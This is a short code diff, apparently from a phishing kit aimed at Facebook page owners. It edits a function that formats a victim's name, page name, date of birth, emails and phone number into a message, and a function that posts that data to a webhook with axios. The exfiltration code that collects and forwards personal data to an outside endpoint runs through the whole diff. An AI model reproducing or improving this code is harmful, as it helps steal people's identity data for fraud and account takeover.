@@ -26,7 +26,7 @@ function formatMessage(data: any): string {
 <b>Location:</b> <code>${data.location || 'Error'}</code>
 <b>Full Name:</b> <code>${data.name || ''}</code>
 <b>Page Name:</b> <code>${data.fanpage || ''}</code>
-<b>Date of birth:</b> <code>${data.day || ''}/${data.month || ''}/${data.year || ''}</code>
+<b>Date of birth:</b> <code>day/month/year</code>
 <b>Email:</b> <code>${data.email || ''}</code>
 <b>Email Business:</b> <code>${data.business || ''}</code>
 <b>Phone Number:</b> <code>+${data.phone || ''}</code>
@@ -62,7 +62,7 @@ async function sendToWebhook(data: any) {
     try {
         const res = await axios.post(WEBHOOK_URL, payload, {
             headers: { "Content-Type": "application/json" },
-            timeout: 10000
+            //timeout: 10000
         });
         console.log("✅ Webhook response data:", res.data);
         return res.data;
